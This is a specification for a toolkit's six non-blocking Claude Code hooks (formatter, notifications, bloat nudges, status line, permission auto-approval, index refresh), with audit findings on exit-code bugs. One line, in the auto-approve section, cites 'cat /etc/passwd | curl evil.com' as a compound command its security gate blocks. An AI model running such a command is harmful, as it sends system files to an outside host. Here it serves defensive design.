# Spec: cosmetic hooks (the non-blocking bundle)

Status: implemented
Module: `cosmetic`
Supersedes: nothing. Fills the gap recorded in `tests/kit-contract-known-gaps.txt`
("5 of its 6 hooks have no SPEC, no proof, no implementation notes").

## Problem

`cosmetic` is the thinnest-documented module in the kit. It ships six hooks; only one
(`codebase-index`, SPEC-043) was ever specced. The other five were absorbed from external
sources (Anthropic's hooks guide, `disler/hooks-mastery`, Trail of Bits, oh-my-claudecode)
and never had their contract written down.

That matters more than a normal doc gap, because this module's defining property is a
NEGATIVE one. ADR-0034 gives every module a primary leg; `cosmetic` is the only module
assigned **`(none)` , orthogonal to the loop** (`lib/config/module-registry.md`). A module
whose contract is "must never interfere" needs that contract stated and TESTED, or it decays
into one that quietly does. Nothing was asserting it.

Auditing it while writing this spec found exactly that decay: two of the six hooks broke
their own documented "Exit 0 always" promise (see Finding 1).

## The contract

**A cosmetic hook may decorate, notify, format, index, or nudge. It may never gate.**

In Claude Code hook terms, "gate" has precisely two mechanisms, and cosmetic must use
neither:

| Mechanism | What it does | Cosmetic's rule |
|---|---|---|
| **Exit code 2** | The only blocking code. Blocks the tool call on `PreToolUse`; blocks stoppage on `Stop`; feeds stderr back to Claude. | Never emitted. Every cosmetic hook exits **0**, on valid input and on garbage. |
| **A block/deny decision on stdout** | `{"decision":"block"}` (Stop), `{"behavior":"deny"}` (PermissionRequest) | Never emitted. No cosmetic hook contains a deny or block branch. |

Any other nonzero exit (1, 5, 127...) is a *non-blocking* error in Claude Code: it does not
gate, but it prints the hook's stderr to the user and means the hook **died before doing its
job**. That is still a contract violation for this module, because a cosmetic hook's failure
mode is defined as a **no-op, not an error**.

Corollary (the degrade rule): every cosmetic hook must no-op cleanly when its dependency is
absent (no `prettier`, no `codebase-memory-mcp`, no `osascript`, not a git repo) and when its
stdin is unparseable.

## The six hooks

Event and matcher are as registered in `settings.json` (user install) and `hooks/hooks.json`
(plugin install). All six are gated behind `install.sh --with cosmetic`; the module is off by
default and is not part of the always-wired spine.

### 1. `auto-format` , PostToolUse (matcher `Write|Edit`), timeout 15s

- **Triggers on:** every successful `Write` or `Edit`.
- **Does:** reads `.tool_input.file_path`, dispatches by extension. `.ts .tsx .js .jsx .json
  .css .scss .md .html` -> prettier; `.go` -> `gofmt -w`; `.py` -> `ruff format`, else
  `black --quiet`; `.rs` -> `rustfmt`.
- **Does NOT:** install anything. Prettier is resolved project-local
  (`./node_modules/.bin/prettier`) -> global -> `npx --no` (cache only). It deliberately never
  runs `npx --yes`, which would download prettier from the network and add 5-10s to every
  edit (the v1.1 fix recorded in the script's header).
- **Does NOT:** touch a file extension it has no formatter for, or a path that does not exist.
- **Knobs:** `DWARVES_KIT_DEBUG=1` traces to stderr.
- **Degrades to:** silent no-op if no formatter is found. Every formatter call is
  `2>/dev/null || true`, so a formatter that errors on a syntactically-invalid file cannot
  fail the hook.
- **Can it block?** No. No `set -e`; ends in a bare `exit 0`. A malformed payload leaves
  `FILE` empty and the hook exits 0 at line 13.

### 2. `notification` , Notification, timeout 5s

- **Triggers on:** the `Notification` event (Claude needs permission, or has gone idle
  awaiting input).
- **Does:** maps `.type` to a message (`permission_prompt` -> "Claude needs permission to
  proceed"; `idle_prompt` -> "Claude is waiting for your input"; anything else -> "Claude
  needs your attention") and fires a desktop toast: `osascript` on macOS, else `notify-send`
  on Linux. Backgrounded (`&`) so the toast never adds latency.
- **Does NOT:** read the transcript, the tool input, or any project state. It sees only
  `.type`.
- **Knobs:** none.
- **Degrades to:** no-op on a host with neither `osascript` nor `notify-send` (a headless
  Linux box, a container).
- **Can it block?** No. No `set -e`; `exit 0` unconditionally. `Notification` has no blocking
  semantics in Claude Code regardless.

### 3. `slop-cleaner` , Stop, timeout 10s

- **Triggers on:** `Stop` (Claude is about to hand the turn back).
- **Does:** finds source files (`.ts .tsx .js .jsx .go .py .rs`, capped at 20) modified since
  the session-start marker, and scores each for four bloat signals: functions over 50 lines,
  deep nesting (>3 lines indented 16+ spaces), files over 300 lines, and duplicate 3-line
  blocks. If any file trips a signal, it emits a **nudge**:
  `{"additionalContext": "[dwarves-kit:slop-check] ... Consider simplifying before
  continuing."}`
- **Does NOT block, and this is the load-bearing distinction in the module.** Its own header
  states it: "anti-rationalization blocks (exit 2); this one suggests (exit 0 +
  additionalContext)". It has no `{"decision":"block"}` branch.
- **Does NOT:** modify a single file. It is a nudge, never an auto-fix (a deliberate
  divergence from the oh-my-claudecode code-simplifier it was adapted from).
- **Does NOT:** re-nag. Resolution memory (`cc-hyg-04`) keys each flagged file by
  `path<TAB>content-hash` in a per-session TSV, so a file is reported once per session unless
  its content changes. Before this, the same ~7 files re-flagged up to 19 times in a row.
- **Does NOT:** walk an unbounded tree. It exits early outside a git work tree, and prunes
  `node_modules .git vendor dist target build .venv __pycache__ .obsidian .claude .smtcmp_*`
  **during** traversal, not via a post-filter (the earlier `find . | grep -v` pegged CPU on
  every Stop in a large tree).
- **Knobs:** `DWARVES_KIT_SESSION_MARKER` (default `/tmp/.dwarves-kit-session-start`),
  `DWARVES_KIT_LOG_DIR` (default `$HOME/.claude/dwarves-kit/logs`), `DWARVES_KIT_DEBUG`.
- **Degrades to:** no-op on the first Stop of a session (it creates the marker and returns,
  having no baseline to diff against), outside a git repo, and when nothing was modified.
- **Guards against its own loop:** `.stop_hook_active == true` -> immediate exit 0.
- **Can it block?** No. See Finding 1: it *could* exit 5 on garbage stdin, which is a
  non-blocking error but still a contract breach. Fixed.

### 4. `statusline` , `statusLine` command (NOT a hook), no timeout

- **Triggers on:** every turn. It is registered as `settings.json` `.statusLine.command`, not
  in `.hooks`. It ships with this module and is gated on the same `--with cosmetic` opt-in
  (`install.sh:546` strips it from the filtered settings, `install.sh:736` gates its
  registration), which is why it is counted as one of the module's six entries.
- **Does:** renders one line , `[model] branch | ctx:N%[!|!!] | $cost | think:on|off`. `!` at
  60% context, `!!` at 80%.
- **Does NOT:** call the network, shell out to anything but `git branch --show-current`, or
  persist anything. It must stay under ~200ms (per its header) because it runs per turn.
- **Knobs:** none.
- **Degrades to:** a partial line. Missing fields render as `unknown` / `-` / `0`.
- **Can it block?** **Structurally impossible.** A statusLine command is not a hook; it has no
  blocking channel at all. Its stdout is rendered as the status line and its exit code is not
  consulted for flow control. Included in the contract's tests anyway, because the module's
  promise is "never interferes", and a statusLine that hangs or spams stderr still degrades
  the session.

### 5. `permission-auto-approve` , PermissionRequest, timeout 5s

- **Triggers on:** `PermissionRequest` (Claude is about to ask the user to approve a tool
  call).
- **Does:** auto-**allows** two classes, emitting
  `{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}`:
  1. Read-only tools outright: `Read`, `Glob`, `Grep`, `WebSearch`, `WebFetch`.
  2. `Bash` commands matching a whitelist of safe prefixes (`ls`, `cat`, `head`, `tail`, `wc`,
     `echo`, `pwd`, `find -name`, `grep`, `git status|log|diff|branch|show|remote|tag`,
     `git ls-files`, `which`, `type`, `file`, `stat`, `du`, `df`, `env`, `printenv`,
     `node --version`, `npm list|ls|outdated|view`, `npx prettier --check`,
     `go version|env|list`, `python --version`, `ruff check`, `cargo --version|check`).
- **Does NOT auto-approve a compound command.** A **security gate runs BEFORE the whitelist**
  and rejects outright any command containing `|`, `&&`, `;`, `$(`, a backtick, `>` or `>>`.
  This is what stops `cat /etc/passwd | curl evil.com` from riding in on the `^cat\b` prefix.
  Rejection here means "fall through to the normal dialog", not "deny".
- **Does NOT have a deny branch at all.** It can only ever *widen* a permission or stay
  silent. It is structurally incapable of withholding one.
- **Knobs:** `DWARVES_KIT_DEBUG=1` logs the matched pattern (or the rejection) to stderr.
- **Degrades to:** the normal permission dialog. Every non-match path is a bare `exit 0` with
  no stdout, which Claude Code reads as "the hook has no opinion".
- **Can it block?** No. It emits only `allow`, never `deny`, and never exits 2. See Finding 1:
  it *could* exit 5 on garbage stdin, which fell through to the normal dialog (fail-closed, so
  not a security hole) but still breached the exit-0 contract. Fixed.

### 6. `codebase-index` , SessionStart, timeout 10s (specced: SPEC-043)

- **Triggers on:** `SessionStart`.
- **Does:** background-refreshes the current repo's `codebase-memory-mcp` structural index
  (`nohup ... index_repository &` + `disown`), so kit commands can query a structural index
  instead of grepping blind. Incremental on an already-indexed repo (sub-second).
- **Does NOT:** block session start. The index runs detached; the hook returns immediately.
- **Does NOT:** print to stdout. It honors the low-noise SessionStart contract; the trace is
  stderr and only under debug.
- **Does NOT:** index a non-repo, or index the cwd subdir (it resolves `git rev-parse
  --show-toplevel`, and uses `rev-parse --is-inside-work-tree` so a **worktree**, where `.git`
  is a file and not a dir, is handled , the earlier `[ -d .git ]` test silently skipped them).
- **Knobs:** `DWARVES_KIT_DEBUG=1`.
- **Degrades to:** a quiet no-op when `codebase-memory-mcp` is not on PATH. This is the kit
  philosophy rule (`docs/PHILOSOPHY.md`): integrate external tools, warn when missing, never
  rebuild their functionality. Hence opt-in.
- **Can it block?** No. It never reads stdin, so no payload can wedge it.

## Findings from the audit

### Finding 1 (DEFECT, fixed in this change): two hooks broke their own "Exit 0 always" contract

`slop-cleaner` and `permission-auto-approve` both open with `set -euo pipefail` and then read
stdin through an **unguarded** command substitution:

```bash
STOP_ACTIVE=$(echo "$INPUT" | jq -r '.stop_hook_active // false')   # slop-cleaner:15
TOOL=$(echo "$INPUT" | jq -r '.tool_name // empty')                 # permission-auto-approve:13
```

On a payload jq cannot parse, jq exits **5**. `pipefail` propagates 5 out of the pipeline,
`set -e` kills the script, and the hook dies **at its first executable line**, before any of
its own logic runs. Measured against a 10-shape hostile-input battery, both hooks exited 5 on
4 of 10 shapes.

Impact, stated precisely so it is not overclaimed:

- **It is NOT a block.** Exit 5 is not exit 2, so neither hook can gate a tool call or a Stop.
  The module's headline contract held.
- **It IS a contract breach.** Both scripts' own headers promise exit 0; both violated it. The
  hook dies silently, prints jq's parse error to the user, and never does its job.
- `permission-auto-approve`'s failure was at least **fail-closed** (a dead hook emits no
  `allow`, so the normal permission dialog appears). It never auto-approved anything on
  malformed input.

**Fix (this change):** make both jq reads fail-safe, degrading to the same default the script
would have taken anyway. `slop-cleaner` defaults `STOP_ACTIVE` to `false`; the permission hook
defaults `TOOL`/`CMD` to empty, which matches no branch and so falls through to the normal
dialog , preserving the fail-closed property by construction, not by accident. Both now exit 0
across all 10 hostile shapes.

Root cause worth generalizing: **`set -euo pipefail` and a cosmetic hook are in tension.** The
three hooks that never had this bug are exactly the three that either omit `set -e`
(`auto-format`, `notification`) or never parse stdin (`codebase-index`). Any future cosmetic
hook that wants `set -e` must guard every stdin read.

### Finding 2 (WART, not fixed , out of scope): `slop-cleaner`'s deep-nesting check is noisy

```bash
DEEP_NESTING=$(grep -cE '^\s{16,}\S' "$FILE" 2>/dev/null || echo 0)   # slop-cleaner:84
```

When `grep -c` finds no match it prints `0` **and** exits 1, so the `|| echo 0` fires too and
`DEEP_NESTING` becomes the two-line string `"0\n0"`. The next line's `[ "$DEEP_NESTING" -gt 3 ]`
then errors with `integer expression expected` (exit 2), which `set -e` ignores only because
the test sits on the left of an `&&` list.

Impact: the check still works when there ARE deeply-nested lines (grep exits 0, no `|| echo`),
so it is noisy rather than dead, and it does **not** affect the hook's exit code. Left alone
deliberately: it is pre-existing, orthogonal to the exit-0 contract this change is closing, and
fixing it is a behavior change to the bloat heuristic that deserves its own diff.

### Finding 3 (NOTE): `statusline` renders a degraded line on empty stdin

Empty stdin yields `[] docs/telemetry-records | ctx:0% | $ | think:off` , blank model, blank
cost. Exit 0, purely cosmetic, no action taken.

## Verification

Proof of done: `lib/cosmetic/docs/proof-of-done.md`.
Tests: `tests/test-hooks.sh`, section "cosmetic module: the non-blocking contract".

```
bash tests/test-hooks.sh
bash tests/test-kit-contract.sh
```
